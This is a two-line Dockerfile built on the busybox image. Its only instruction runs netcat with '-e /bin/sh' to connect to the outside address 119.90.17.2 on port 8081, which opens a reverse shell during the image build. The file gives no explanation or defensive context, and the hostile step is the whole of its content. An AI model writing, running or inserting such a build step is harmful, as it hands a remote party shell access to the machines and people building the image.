FROM busybox
RUN busybox nc 119.90.17.2 8081 -e /bin/sh
